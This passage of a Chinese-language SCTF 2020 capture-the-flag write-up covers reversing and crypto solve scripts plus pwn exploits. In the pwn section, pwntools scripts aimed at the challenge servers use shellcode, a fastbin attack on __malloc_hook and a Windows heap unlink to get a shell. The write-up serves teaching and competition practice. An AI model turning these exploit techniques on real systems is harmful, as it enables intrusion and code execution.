def fun5():
	fun7(1, 73)
	fun7(2, 89)
	.......

# -1 21 22 2 122 17 23 11 -2 
def fun6(a):
	flag[a] ^= 122 

# -1 10 8 27 22 21 13 8 4 7 5 2 2 20 10 3 11 -2 
def fun7(reg_b, reg_a):
	a = fun8(reg_a)
	if (flag[reg_b] - a != 4):
		fun3(2)

# -1 21 2 108 17 20 11 -2 
def fun8(reg_a):
	return reg_a ^ 108
# -2 
```

其实就是异或和减法， 用函数调用打乱了一些而已

#### flag：

```python
arr = [73,89,70,84,-111,116 ,103,124,121,102,99,42,124,77,121,123,43,43,77,43,43,111]

print(bytes(map(lambda x: (((x ^ 108) + 4) ^ 122), arr)))
```

![](https://i.loli.net/2020/07/08/uqFPoQXhL3vBJt5.png)

![](https://i.loli.net/2020/07/08/wk3qmsjBegl47vI.png)


### signin
程序是python写的，这一点可以从IDA打开后<kbd>shift</kbd>+<kbd>f12</kbd>打开Strings Window看出来，各种`py`开头的字符串遍地走。细心一点可以确认这是pyinstaller打包而不是py2exe。

先使用[pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)解开，还原Python代码。命令：`python pyinstxtractor.py signin.exe`

目录`\signin.exe_extracted`下，使用uncompyle6获得`main.pyc`源码。（值得注意的是，pyinstxtractor解开的时候有显示是**python38**！如果在python37环境下使用uncompyle6则可能不能得到完整的代码。

根据main.py自行反编译需要的pyc文件。可以看出程序是PyQt5写得，**程序启动时释放了一个DLL**，退出时删除。所以可以运行时把tmp.dll复制出去分析。

可以看到（看下面代码注释）：
```python
# main.py
# ....
class AccountChecker:

    def __init__(self):
        self.dllname = './tmp.dll'
        self.dll = self._AccountChecker__release_dll()
        self.enc = self.dll.enc
        
        # 这里已经表明调用dll中的 enc 函数，
        # 函数名参数类型和返回值都体现出来了，分析dll就方便很多了
        self.enc.argtypes = (c_char_p, c_char_p, c_char_p, c_int)
        self.enc.restype = c_int

        self.accounts = {b'SCTFer': b64decode(b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA')}
        self.try_times = 0
# ....
```

整体逻辑就是调用dll对用户名和密码进行加密，返回python部分进行校验。dll里面enc的逻辑比较简单，参数分别是
```
username, password, safe_password_recv, buffersize
```
有需要的话可以使用类似下面的代码进行对dll的调试
```c
#include <stdio.h>
#include <Windows.h>

int main() {
    HMODULE module = LoadLibraryA(".\\enc.dll");
    if (module == NULL) {
        printf("failed to load");
        return 1;
    }

    typedef int(*EncFun)(char*, char*, char*, int);
    EncFun enc;
    enc = (EncFun)GetProcAddress(module, "enc");

    char username[20] =  "SCTFer" };
    char pwd[33] = { "SCTF{test_flag}" };
    char recv[33] = { 0 };
    printf("%d",enc(username, pwd, recv, 32));
    return 0;
}
```

加密逻辑不是很复杂，这里不再赘述，注意字节序就好，解题脚本如下：
```python
from base64 import *
import struct

def u_qword(a):
    return struct.unpack('<Q', a)[0]

def p_qword(a):
    return struct.pack('<Q', a)

username = list(b'SCTFer')
enc_pwd = list(b64decode(b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA'))[:-1] # remove the last '\0'
for i in range(32):
    enc_pwd[i] ^= username[i % len(username)]

qwords = []
for i in range(4):
    qwords.append(u_qword(bytes(enc_pwd[i*8: i*8 + 8])))

for i in range(4):
    qword = qwords[i]
    for _ in range(64):
        if qword & 1 == 1:
            # 如果最低位是1，说明加密时左移后，
            # 和12682219522899977907进行了异或
            qword ^= 12682219522899977907
            qword >>= 1
            qword |= 0x8000000000000000
            continue
        else:
            qword >>= 1
    # print(qword)
    qwords[i] = qword

pwd = []
for i in range(4):
    pwd.append(p_qword(qwords[i]).decode())

flag = ''.join(pwd)
print(flag)
```
得到flag `SCTF{We1c0m3_To_Sctf_2020_re_!!}`

### secret

#### 出题思路
首先很明显这是一个指令抽取壳，dex文件中指令丢失，在so中还原。  
用到的是`inline-hook`,hook`libdvm.so`的`dexFindClass`,在加载类时进行指令还原

抽取的指令,和一些字符串进行加密保存，在`.init`段进行了自解密，算法为rc4,密钥为`havefun`

指令还原后完整的dex执行逻辑为,将`SCTF`类的`b`字段作为密钥,将输入的字符串进行`xxtea`加密后与`SCTF`类的`c`字段比较

值得注意的是在`JNI_OnLoad()`时替换了`SCTF`中的`b`,`c`字段

#### 解题方法
1. 硬逆so层，还原字节码
2. 众所周知，app既然要运行起来，代码必将加载到内存。所以可以在适当时间将完整的dex从内存中dump出来  
本题可在`d.a.c`的`public static String a(String arg1, String arg2, String arg3)`方法（点击play按钮后该方法的字节码会加载到内存）`o1`方法执行后`o2`方法执行前将dex dump

### get_up
第一层smc的秘钥经测试在大部分在线工具站都可以查到
![](http://roomoflja.cn/wp-content/uploads/2020/07/upload_3da6d43a46b537c4dfcae58d416047e4.jpg)
第二层秘钥用了flag前5位`SCTF{`做秘钥

然后进行常规的rc4算法对flag进行加密,rc4秘钥是`syclover`并用其他逻辑运算代替异或来完成数据交换
```cpp
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		s[i] = (s[i] & ~s[j]) | (~s[i] & s[j]);
		s[j] = (s[i] & ~s[j]) | (~s[i] & s[j]);
		s[i] = (s[i] & ~s[j]) | (~s[i] & s[j]);
		t = (s[i] + s[j]) % 256;
		data[k] ^= s[t];
		//printf("%2.2x,", data[k]);
	}
```

解密只要输入格式符合的字符串再拿到该字符串的密文就可写脚本了


```python
d=[128, 85, 126, 45, 209, 9, 37, 171, 60, 86, 149, 196, 54, 19, 237, 114, 36, 147, 178, 200, 69, 236, 22, 107, 103, 29, 249, 163, 150, 217]
s=[128, 85, 126, 45, 209, 18, 62, 176, 35, 31, 136, 150, 12, 45, 211, 76, 24, 173, 161, 202, 16, 210, 66, 101, 89, 25, 172, 177, 142, 197]
s1='SCTF{aaaaaaaaaaaaaaaaaaaaaaaaa'#输入的flag
for i in range(len(s)):
	print(chr(d[i]^s[i]^ord(s1[i])),end='')
# SCTF{zzz~(|3[___]_rc4_5o_e4sy}[

```
### Easyre
如其名，这个题确实是easy..
通过查找字符串的方法找到的虚假main函数里将`isdebug`段置1然后调用`IsDebuggerPresebt`结束函数
真正的主要逻辑是通过crc32校验出来的值解密dll，并`memload`调用dll
dll内部的实现了一个aes加密以及一些简单的位运算
脚本如下
```python
from Crypto.Cipher import AES

enc = [142, 56, 81, 115, 166, 153, 42, 240, 218, 213, 106, 145, 233, 78, 152, 206, 42, 183, 61, 64, 241, 229, 29, 171, 239, 238, 176, 214, 20, 11, 42, 149]

for i in range(len(enc)):
    enc[i] ^= 0x55

for i in range(21, 28):
    p = (enc[i] & 0xaa)>>1
    q = (enc[i]<<1) & 0xaa
    enc[i] = (p|q)^0xad

for i in range(14, 21):
    p = (enc[i] & 0xcc)>>2
    q = (enc[i]<<2) & 0xcc
    enc[i] = (p|q)^0xbe

for i in range(7, 14):
    p = (enc[i] & 0xf0)>>4
    q = (enc[i]<<4) & 0xf0
    enc[i] = (p|q)^0xef

#print (enc)
cipher = enc
key = b"5343544632303230"
key = list(key)
cipher = bytes(cipher)
key = bytes(key)
aes = AES.new(key, mode=AES.MODE_ECB)
flag = aes.decrypt(cipher)

print (flag)
#SCTF{y0u_found_the_true_secret}
```

### Orz

很直来直去的算法逆向题目，总共两部分。

第一部分，首先判断输入长度是否为32字节，接着根据输入的第七位、第十六位、第三十位计算得到一个种子 seed，然后生成33个随机数放在数组 a 中，使用这个数组 a 的值和输入进行计算得到大小为64的数组 b，数据类型是 unsigned int。

第一部分题目代码如下。

```
        char *input = (char*)malloc(33);

        scanf("%s", input);

        int length = strlen(input);

        if (length != 32) {

               exit(0);

        }

        int value = (input[6] + input[15] + input[29]) * 53;     

        unsigned int *tmp = myrandint((~value)&0xfff, input);



        unsigned long long int * tmp2 = (unsigned long long int *)tmp;

        unsigned long long int * data = (unsigned long long int *)malloc(sizeof(unsigned 
long long int) * 32);


```


```

unsigned int * myrandint(unsigned int seed, char * input)

{

        unsigned long long int a = 32310901;

        unsigned long long int b = 1729;

        unsigned int c = seed;

        int m = 254;

        unsigned int * ret1 = (unsigned int*)malloc(33 * sizeof(int));

        memset(ret1, 0, 33 * sizeof(int));

        for (int i = 0; i < 33; i++) {

               ret1[i] = (a * c + b) % m;

               c = ret1[i];

        }



        unsigned int  * ret2 = (unsigned int*)malloc(64 * sizeof(int));

        memset(ret2, 0, 64 * sizeof(unsigned int));

        for (int i = 0; i < 32; i++)

        {

               for (int j = 0; j < 33; j++)

               {

                       unsigned int tmp = (unsigned int)input[i] ^ ret1[j];

                       ret2[i + j] += tmp;

               }

        }

        return ret2;

}

```


第二部分，使用 unsigned long long int 类型指针指向数组b，可以理解为把数组 b 转化为大小为32、数据类型为 unsigned long long int 的数组 c，接着就是进一步处理和加密数组 c。每次处理数组 c 两个值，第一个当作 key，第二个当作 data。

然后首先是已经很常见的算法套路，就是64重循环对 key 不断乘二，并且对乘二后的值进行判断，如果溢出了 key 就异或一个奇数，逆向的时候从 key 异或奇数这里入手，因为乘二后一定是偶数，偶数异或奇数后一定是奇数。

我在这里的基础上加了 DES 加密，用了两种模式。如果没有溢出就使用 key 对 data 进行 DES-ECB 加密，如果溢出了就使用 key 对 data 进行 DES-CBC 加密，最后再对得到的32位数据进行比较。DES-CBC 加密的 iv 是“syclover”。

第二部分题目代码如下。

```
        unsigned long long int * tmp2 = (unsigned long long int *)tmp;

        unsigned long long int * data = (unsigned long long int *)malloc(sizeof(unsigned 
long long int) * 32);



        for (int i = 0; i < 16; i++) {

               unsigned long long int* ret = encrypt(tmp2[2 * i], tmp2[2 * i + 1]);

               data[2 * i] = ret[0];

               data[2 * i + 1] = ret[1];

        }



        unsigned long long int cmp_data[32] = { 
2153387829194836539,4968037865209379450,8168265158727502467,7752938936513403525,14501680424383085918,17239894214146562937,8631814439533536846,14038875394924393076,4195845133744611697,5882449358190368069,16593579054240177091,6042071195929524833,4901359238874180132,5391991813165233830,1262912001997768975,10592048914693378762,16027373129319566784,8683865403612614472,1074685249143409626,14830847864020240442,839851004411889868,6756767667889788695,10980352984506363454,15143378206568444148,9137722182184199592,16483482195781840874,213411729123350449,8809840326310832316,6556887299588007217,4475244256249997594,4953583337191211260,6316604661095411857 };



        for (int i = 0; i < 32; i++) {

               if (cmp_data[i] != data[i]) {                             

                       exit(0);

               }

        }

        printf("Success!\n");


```

```


unsigned char * llu2key(unsigned long long int key) {

        unsigned char * ckey = (unsigned char *)malloc(9);

        memset(ckey, 0, 9);

        memcpy(ckey, &key, 8);

        return ckey;

}



unsigned char * llu2data(unsigned long long int data) {

        unsigned char * cdata = (unsigned char *)malloc(17);

        memset(cdata, 0, 17);

        memcpy(cdata, &data, 16);

        return cdata;

}



unsigned long long int* encrypt(unsigned long long int key, unsigned long long int data) 
{//,unsigned char * data 64 * 4   8 * 32  16 * 16

        unsigned char * ckey = 0;

        unsigned char * cdata;

        cdata = llu2data(data);



        for (int i = 0; i < 64; i++) {

               unsigned long long int temp = key;

               key = key * 2;

               if (key < temp) {

                       key = key ^ 0x3FD99AEBAD576BA5;

                       ckey = llu2key(key);

                       des_cbc_encrypt(cdata, cdata, 8, ckey);

               }

               else {

                       ckey = llu2key(key);

                       des_ecb_encrypt(cdata, cdata, 8, ckey);

               }

        }



        unsigned long long int* retarr = (unsigned long long int*)malloc(sizeof(unsigned 
long long int) * 2);

        retarr[0] = *(unsigned long long int*)ckey;

        retarr[1] = *(unsigned long long int*)cdata;



        return retarr;

}

```

编译的话是用 Visual Studio 2017 进行的 release x86 方式进行的编译，优化得还是比较厉害的，比如CBC模式加密的 iv 我本来藏得还是比较深的，然后程序生成后进行反编译是能直接看到的，还有就是 unsigned long long int 型的整数会使用两个寄存器来表示等等。

然后说下我自己的解题思路。

第一部分我自己的逆向解题思路是爆破中使用z3，因为在计算种子 seed 时候最后有 &0xfff，范围就这么大，随机数数组 a 是根据种子 m 生成的，可以爆破所有可能的种子 m ，然后剩下的交给 z3 来求解。听别的师傅说这个题被花样爆破了，甚至是用汇编爆破的，真是太强了，期待看到师傅分享出来不同的解题思路...

然后第二部分就是直接逆了，前面有说到64重循环 key 乘二从异或奇数入手，然后进行 DES 的两种模式解密。

放出我自己的解题脚本，python3 装下 z3-solver 和 pycryptodome 库就可以运行了。

```
from Crypto.Cipher import DES
import struct
from z3 import *

def des_ecb_decrypt(cipher,key):
    des = DES.new(key, mode=DES.MODE_ECB)
    cipher = bytes(cipher)
    if (len(cipher) != 8):
        cipher = b'\0' * (8 - len(cipher)) + cipher
    plain = des.decrypt(cipher)
    return plain

def des_cbc_decrpt(cipher,key):
    iv = b"syclover"
    des = DES.new(key, mode=DES.MODE_CBC, iv=iv)
    if (len(cipher) != 8):
        cipher = b'\0' * (8 - len(cipher)) + cipher
    cipher = bytes(cipher)
    plain = des.decrypt(cipher)
    return plain

def myfun(key,data):
    #print("%x %x" % (key, data))
    data = struct.pack(">Q", data)[::-1].strip()
    #print(data)
    #print(list(data))
    for i in range(64):
        if(key%2==0):
            ckey = struct.pack(">Q", key)[::-1]
            data = des_ecb_decrypt(data,ckey)
            key = key // 2
        else:
            ckey = struct.pack(">Q", key)[::-1]
            data = des_cbc_decrpt(data,ckey)
            key ^= 0x3FD99AEBAD576BA5
            key = (key // 2) + (0xffffffffffffffff - 1) // 2 + 1

    key_str = "%x"%key
    if(len(key_str)%2 !=0):
        key_str = "0"+key_str

    key_arr = list(bytes.fromhex(key_str))[::-1]
    for i in range(8-len(key_arr)):
        key_arr.append(0)

    tmp = []
    tmp+=key_arr
    tmp+=list(data)
    return tmp


def myrandint( start,end,seed):
    a=32310901
    b=1729
    rOld=seed
    m=end-start
    while True:
        rNew=int((a*rOld+b)%m)
        yield rNew
        rOld = rNew


def Z3(xor_data,cmp_data):
    s = Solver()
    flag =  [BitVec(('x%d' % i),8) for i in range(32) ]

    xor_result = [0 for i in range(64)]
    for i in range(32):
        for j in range(33):
            a = flag[i] ^ xor_data[j]
            xor_result[i + j] += a

    for i in range(0,64):
        s.add(xor_result[i] == cmp_data[i])

    if s.check() == sat:
        model = s.model()
        str = [chr(model[flag[i]].as_long().real) for i in range(32)]
        print( "".join(str))
        time.sleep(5)
        exit()
    else:
        print ("unsat")

if __name__ == "__main__":
    key = 2153387829194836539
    data = 4968037865209379450
    cmp_data = [2153387829194836539,4968037865209379450,8168265158727502467,7752938936513403525,14501680424383085918,17239894214146562937,8631814439533536846,14038875394924393076,4195845133744611697,5882449358190368069,16593579054240177091,6042071195929524833,4901359238874180132,5391991813165233830,1262912001997768975,10592048914693378762,16027373129319566784,8683865403612614472,1074685249143409626,14830847864020240442,839851004411889868,6756767667889788695,10980352984506363454,15143378206568444148,9137722182184199592,16483482195781840874,213411729123350449,8809840326310832316,6556887299588007217,4475244256249997594,4953583337191211260,6316604661095411857]
    sum = []
    for i in range(16):
        sum+=(myfun(cmp_data[2*i],cmp_data[2*i+1]))
    value = []
    for i in range(len(sum)//4):
        value.append(sum[4*i]+0x100*sum[4*i+1]+0x1000*sum[4*i+2]+0x10000*sum[4*i+3])

    for seed in range(0xfff):
        print(seed)
        xor_data = []
        #r = myrandint(1, 255, 99)
        r = myrandint(1, 255, seed)
        for i in range(33):
            xor_data.append(next(r))
        Z3(xor_data,value)

```

爆破到 99 时候就出来 flag了，flag 为 SCTF{b5c0b187fe309af0f4d35982fd}。 

![](https://i.loli.net/2020/07/08/lKpejGkhon6HiAT.png)



## Crypto

### RSA
[Lattice Based Attack on Common Private Exponent RSA](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.450.8522&rep=rep1&type=pdf)
``` python
from base64 import b16decode
M = matrix(ZZ, 4, 4)
M[0, 0] = 9340839063356994543825244634439511746168190665008710505312793938053942051578773541905721378366249085682424830408563162405353174129977981998168120082963619

M[0, 1] = 51983813665671800409839988493029246480070074834841243495961153551775041734427962445872206132230740295302754013962953264876213932808699081864133090192643613789187721225535425912301364390420043383226457510304822096397715316371940024746022705176795180819408076922934552124373282859536967093759368041876524225139
M[1, 1] = -64654556231563695547493500054632859378349684890112764196584470405550515097294751579707227891255194885132433625167039162096344730307555508022839694405138861889000145901955321456009232987544380737060291863753072870240289176719347333380538372971927607904400675634229083209011094844177200435042629699575056728699

M[0, 2] = 27739852474419814228424766924939927182500516940059791169884494311457023682682230955930800978332815986965586583064459588099484588195620051027704700779477722077749045118897076513621888201257345893078071262859502274345222853921855050442599821812942390370406366416961645664934820366758955722115914057396318787763
M[2, 2] = -74561423829806980524762065744155854310440311101120993432266010620312856451632675934042147880250464659466017963810572077347801696514675652965621592345498505236749292061898839126590516721706748456057877425174070374594141399926282566873744118828366392787410273564550665904842042511263241293542741010537465102549

M[0, 3] = 52410295784947271807699643665492970476313244237108219429498040919274591805644565698024448558334954813038722155025541077631406997664892706754011478896823826919399377762601338482475790274399209231131418307414926175342665178227305755286417956083958970337197812786680712427177379910792964894812040492910957653247
M[3, 3] = -87251274407535975129608866158128487370461251684094714478155440086809079998231882544278049923953015443634719979966094891747120081394876471201674948529612176388367317640140769795923453417761838492471434429225347211071537368045520244029666892473137131731436015187840445356660313211735614312893366598786502415141
S = M.LLL()
d = abs(S[0][0])/M[0][0]
#print(d)
n1=87251274407535975129608866158128487370461251684094714478155440086809079998231882544278049923953015443634719979966094891747120081394876471201674948529612176388367317640140769795923453417761838492471434429225347211071537368045520244029666892473137131731436015187840445356660313211735614312893366598786502415141
c1=21551750332345122871179549552729450671666301239047430727233645786059420932730878556425786175119768649063802412108774800797599339474458058991692461489091449347205047107377019431027507235000069856965995634720386916586363494704156772213011202200368450136695450540531985954052107694827395812747657750091227056093
print(b16decode(hex(pow(c1, d, n1))[2:].upper()))
```
### Lattice
题没出好，本来想考用第二篇文章的格解，用第一篇文章的代码实现，结果出题前测第一篇文章的时候测错了，导致直接用第一篇文章的exp就能解出FLAG。。。师傅们轻点喷。。。
[LatticeHacks](https://latticehacks.cr.yp.to/ntru.html)
[NTRUEncrypt and Lattice Attacks](https://pdfs.semanticscholar.org/67e7/020ce5649947e2199bc0eb8bd62b9a31ca4e.pdf)
``` python
from binascii import unhexlify
Zx.<x> = ZZ[]
n = 109 
q = 2048
p = 3
h = 510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248
e= -453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852
def inv_mod_prime(f,p):
    T = Zx.change_ring(Integers(p)).quotient(x^n-1)
    return Zx(lift(1 / T(f)))

def mul(f,g):
    return (f * g) % (x^n-1)

def bal_mod(f,q):
    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))
    return Zx(g)

def decrypt(e,pri_key):
    f,fp = pri_key
    a = bal_mod(mul(e,f),q)
    d = bal_mod(mul(a,fp),p)
    return d

def get_key():
	for j in range(2 * n):
		try:
			f = Zx(list(M[j][:n]))
			fp = inv_mod_prime(f,p)
			return (f,fp)
		except:
			pass
	return (f,f)

if __name__ == '__main__':
	M = matrix(ZZ, 2*n, 2*n)
	hh = bal_mod(lift(1/Integers(q)(p)) * h,q)
	for i in range(n): M[i,i] = 1
	for i in range(n,2*n): M[i,i] = q
	for i in range(n):
		for j in range(n):
			M[i,j+n] = hh[(n-i+j) % n]
	M = M.LLL()
	key = get_key()
	for i in range(8):
		try:
			print(unhexlify(hex(int(''.join([str(_) for _ in decrypt(e, key).list()])+'0'*i, 2))[2:].upper()))
		except:
			pass
```

## pwn
### coolcode
```
from pwn import *
context.log_level = "debug"
context.arch = 'amd64'
elf = ELF("demo")
local = 0
if local:
	p = process("./CoolCode")
else:
	p = remote("39.107.119.192", 9999)


def db():
	gdb.attach(p, 'b delete')

def choose(num):
	p.sendlineafter("Your choice :", str(num))


def add(idx, mes):
	choose(1)
	p.sendlineafter("Index: ", str(idx))	
	p.sendafter("messages: ", mes)

def show(idx):
	choose(2)
	p.sendlineafter("Index: ", str(idx))

def delete(idx):
	choose(3)
	p.sendlineafter("Index: ", str(idx))

chunk_list = 0x602140

add(-37, "SX"+"RXWZ"+"4S0BD"+"SX4045"+"0BC"+"48420BB"+"XXX" +"UX")
#db()
'''
push   rsp
pop    rdx
xor    esi, DWORD PTR [edx]
push   rdx
pop    rax
xor    edi, DWORD PTR [eax]
push   rbx
pop    rax
xor    al,0x5A
push   rax
pop    rdx
push   rbp
pop    rax
push   rsi
'''
add(0,  "TZ"+"32"+"RX"+"38"+"SX"+"4Z"+"PZ"+"UX")
add(1,  "RZ"*7+"VVWX")#----
#db()
delete(0)
shellcode_mmap = '''
/*mmap(0x40000000,0x100,7,34,0,0)*/
push 0x40000000 /*set rdi*/
pop rdi
push 0x100 /*set rsi*/
pop rsi
push 7 /*set rdx*/
pop rdx
push 0x22 /*set rcx*/
pop r10
push 0 /*set r8*/
pop r8
push 0 /*set r9*/
pop r9
push 0x9
pop rax
syscall/*syscall*/
push rdi
pop rsi
push 0
pop rax
push 0x100
pop rdx
push 0
pop rdi
syscall
push rsi
ret
'''

p.sendline(asm(shellcode_mmap))
payload = '''
push 0x23
push 0x4000000b
pop rax
push rax
retfq
'''
open_shellcode = '''
mov esp, 0x40000100
xor ecx,ecx
xor edx,edx
mov eax,0x5
push 0x67616c66
mov ebx,esp
int 0x80
mov ecx,eax
'''
ret_64 = '''
push 0x33
push 0x40000030
retfq
nop
nop
nop
nop
nop
nop
'''
read_shellcode = '''
push 0x3;
pop rdi;
push 0x0;
pop rax;
push 0x40000200
pop rsi;
push 0x100;
pop rdx;
syscall;
'''

write_shellcode = '''
push 0x1
pop rdi
push 0x1
pop rax
syscall
'''
#db()
raw_input("write flag")
p.sendline(asm(payload)+asm(open_shellcode)+asm(ret_64)+asm(read_shellcode)+asm(write_shellcode))

p.interactive()



```

### snake
因为 linux 缺少函数头 所以程序写的很垃圾（变向增加逆向难度了）
在贪吃蛇撞墙后 会有一个输入
如果蛇在右下角的墙死掉就能触发 一个 offbyone
从而能够 修改size 后得到 libc 
然后利用 fastbin attack 打malloc_hook等
```python=
from pwn import *
context.log_level='debug'
exe = './snake'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
one = [0x45216, 0x45216, 0xf02a4, 0xf1147]
elf = ELF(exe)
p=process(exe)
p=remote('39.107.244.116',9999)

def leave_words(text):
	p.sendafter("please leave words:\n",text)

def exit(index):
	p.sendlineafter("if you want to exit?\n",index)

def menu(idx):
	p.sendlineafter("4.start name\n",str(idx))

def add(index,lenght,name):
	menu(1)
	p.sendlineafter("index?\n",str(index))
	p.sendlineafter("how long?\n",str(lenght))
	p.sendlineafter("name?",name)

def delete(index):
	menu(2)
	p.sendlineafter("index?",str(index))

def get(index):
	menu(3)
	p.sendlineafter("index?",str(index))

def start():
	menu(4)

def pwn():
	p.sendlineafter("how long?\n",str(0x40))
	p.sendlineafter("input name","AAAAAAAAAAAAAAAA")
	p.sendline()
	for i in range(0x23):
		p.sendline()
	leave_words("A"*76+'\x91')
	p.sendline('n')
	add(1,0x60,p64(0x31)*8)
	
	add(2,0x60,'/bin/sh\x00')
	delete(0)
	add(0,0x60,'AAAAAAA')
	start()
	p.recvuntil("AAAAAAA\n")
	leak= u64(p.recv(6).ljust(8,'\x00'))
	success('libc-->'+hex(leak))
	libc.address = leak-0x3c4bf8
	success('libc.address-->'+hex(libc.address))
	mallochook=libc.sym['__malloc_hook']
	success("mallo_chook-->"+hex(mallochook))
	fakechunk=mallochook-0x23

	for i in range(0x23):
		p.sendline()

	p.sendline('AAAA')
	p.sendlineafter("if you want to exit?\n",'n')

	delete(1)
	delete(0)

	add(0, 0x60,'BBBBBBBB'*9+p64(0x71)+p64(fakechunk))
	add(0, 0x60,'funk')
	add(0, 0x60,'AAA'+"BBBBBBBB"*2+p64(libc.address+one[3]))

	menu(1)
	p.sendlineafter("index?",str(3))
	p.sendline(str(1))
	# raw_input("111")
	# gdb.attach(p)



	

	p.interactive()

pwn()
```

### EasyWinHeap
题目存在UAF漏洞,可以泄露出heap地址,又因为结构体指针保存在堆中所有可以用unlink实现任意读写,泄露`ucrtbase.dll`基地址计算出`system`,然后覆盖到puts即可得到shell
这里参考下venom战队exp
``` python
from pwn import *
#context.log_level = 'debug'
p = remote("47.94.245.208", 23333)

def add(size):
    p.sendlineafter("option >\r\n", '1') 
    p.sendlineafter("size >\r\n", str(size)) 

def show(idx):
    p.sendlineafter("option >\r\n", '3') 
    p.sendlineafter("index >\r\n", str(idx))
    
def free(idx):
    p.sendlineafter("option >\r\n", '2') 
    p.sendlineafter("index >\r\n", str(idx)) 
    
def edit(idx, content):
    p.sendlineafter("option >\r\n", '4') 
    p.sendlineafter("index >\r\n", str(idx)) 
    p.sendlineafter("content >\r\n", content) 
    
def exp():
    for i in range(6):
        add(32) 
    free(2)
    free(4) 
    show(2) 
    heap_addr = u32(p.recvuntil("\r", drop=True)[:4]) 
    log.info("heap_addr ==> " + hex(heap_addr)) 
    edit(2, p32(heap_addr-0xd8)+p32(heap_addr-0xd4)) 
    free(1) 
    show(2) 
    p.recv(4) 
    image_base = u32(p.recv(4))-0x1043 
    log.info("image_base ==> " + hex(image_base)) 
    puts_iat = image_base + 0x20c4 
    log.info("puts_iat ==> " + hex(puts_iat)) 
    edit(2, p32(puts_iat)+p32(image_base+0x1040)+p32(heap_addr-0xe8)) 
    show(2) 
    ucrtbase = u32(p.recv(4))-0xb89f0 
    log.info("ucrtbase ==> " + hex(ucrtbase)) 
    system = ucrtbase+0xefda0 
    edit(0, 'cmd\x00') 
    edit(3, p32(system)+p32(heap_addr-0x60)) 
    show(0) 
    p.interactive

if __name__ == '__main__':
    exp()
```


### MSRC Top 0xFFFFFFFF
题目给了两个MSRPC服务器，存根均使用/Oicf编译。使用IDA脚本findrpc.py可快速定位管理器入口点向量位置。这里介绍一些扩充知识，方便一些以前没有接触过的朋友理解MSRPC存根中定义的几个结构体间的关系，如果不感兴趣请跳过，毕竟我们最终只需使用工具搜索服务例程。

```cpp=
typedef struct _RPC_SERVER_INTERFACE
{
    unsigned int Length;
    ...
    PRPC_DISPATCH_TABLE DispatchTable;
    ...
    void const __RPC_FAR *InterpreterInfo;
    unsigned int Flags ;
} RPC_SERVER_INTERFACE, __RPC_FAR * PRPC_SERVER_INTERFACE;
```
每个`RPC_SERVER_INTERFACE`结构代表一个接口。其`DispatchTable`成员指向`RPC_DISPATCH_TABLE`结构：
```cpp=
typedef struct {
    unsigned int DispatchTableCount;
    RPC_DISPATCH_FUNCTION __RPC_FAR * DispatchTable;
    LONG_PTR                          Reserved;
